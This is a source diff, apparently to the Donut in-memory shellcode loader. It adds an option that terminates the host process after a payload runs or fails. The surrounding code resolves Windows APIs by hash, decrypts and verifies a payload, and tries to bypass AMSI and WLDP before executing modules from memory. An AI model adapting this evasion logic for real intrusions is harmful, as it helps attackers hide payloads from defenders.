@@ -32,16 +32,17 @@
 #include "payload.h"
 
 DWORD ThreadProc(LPVOID lpParameter) {
-    ULONG           i, ofs;
-    ULONG64         sig;
-    PDONUT_INSTANCE inst = (PDONUT_INSTANCE)lpParameter;
-    DONUT_ASSEMBLY  assembly;
-    PDONUT_MODULE   mod;
-    VirtualAlloc_t  _VirtualAlloc;
-    VirtualFree_t   _VirtualFree;
-    LPVOID          pv;
-    ULONG64         hash;
-    BOOL            disabled;
+    ULONG                i, ofs;
+    ULONG64              sig;
+    PDONUT_INSTANCE      inst = (PDONUT_INSTANCE)lpParameter;
+    DONUT_ASSEMBLY       assembly;
+    PDONUT_MODULE        mod;
+    VirtualAlloc_t       _VirtualAlloc;
+    VirtualFree_t        _VirtualFree;
+    RtlExitUserProcess_t _RtlExitUserProcess;
+    LPVOID               pv;
+    ULONG64              hash;
+    BOOL                 disabled, term;
     
     DPRINT("Maru IV : %" PRIX64, inst->iv);
     
@@ -50,11 +51,20 @@ DWORD ThreadProc(LPVOID lpParameter) {
     _VirtualAlloc = (VirtualAlloc_t)xGetProcAddress(inst, hash, inst->iv);
     
     hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualFree) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-    DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
+    DPRINT("Resolving address for VirtualFree() : %" PRIX64, hash);
     _VirtualFree  = (VirtualFree_t) xGetProcAddress(inst, hash,  inst->iv);
     
-    if(_VirtualAlloc == NULL || _VirtualFree == NULL) {
+    hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.RtlExitUserProcess) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+    DPRINT("Resolving address for RtlExitUserProcess() : %" PRIX64, hash);
+    _RtlExitUserProcess  = (RtlExitUserProcess_t) xGetProcAddress(inst, hash,  inst->iv);
+    
+    if(_VirtualAlloc == NULL || _VirtualFree == NULL || _RtlExitUserProcess == NULL) {
       DPRINT("FAILED!.");
+      // terminate host process?
+      if(inst->exit) {
+        DPRINT("Terminating host process");
+        _RtlExitUserProcess(0);
+      }
       return -1;
     }
     
@@ -66,6 +76,11 @@ DWORD ThreadProc(LPVOID lpParameter) {
     
     if(pv == NULL) {
       DPRINT("Memory allocation failed...");
+      // terminate host process?
+      if(inst->exit) {
+        DPRINT("Terminating host process");
+        _RtlExitUserProcess(0);
+      }
       return -1;
     }
     DPRINT("Copying %i bytes of data to memory %p", inst->len, pv);
@@ -89,7 +104,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     
     DPRINT("Generating hash to verify decryption");
     ULONG64 mac = maru(inst->sig, inst->iv);
-    DPRINT("Instance : %016llx | Result : %016llX", inst->mac, mac);
+    DPRINT("Instance : %"PRIX64" | Result : %"PRIX64, inst->mac, mac);
     
     if(mac != inst->mac) {
       DPRINT("Decryption of instance failed");
@@ -132,8 +147,6 @@ DWORD ThreadProc(LPVOID lpParameter) {
       mod = inst->module.p;
     }
     
-    // does module require decompression?
-    
     // try bypassing AMSI and WLDP?
     if(inst->bypass != DONUT_BYPASS_SKIP) {
       // Try to disable AMSI
@@ -148,6 +161,8 @@ DWORD ThreadProc(LPVOID lpParameter) {
       if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
         goto erase_memory;
     }
+    
+    // perform decompression here
     
     // unmanaged EXE/DLL?
     if(mod->type == DONUT_MODULE_DLL ||
@@ -183,12 +198,22 @@ erase_memory:
       }
     }
     
+    // should we call RtlExitUserProcess?
+    term = (BOOL)inst->exit;
+    
     DPRINT("Erasing RW memory for instance");
     Memset(inst, 0, inst->len);
     
     DPRINT("Releasing RW memory for instance");
     _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
     
+    if(term) {
+      DPRINT("Terminating host process");
+      // terminate host process
+      _RtlExitUserProcess(0);
+    }
+    DPRINT("Returning to caller");
+    // return to caller, which invokes RtlExitUserThread
     return 0;
 }
 
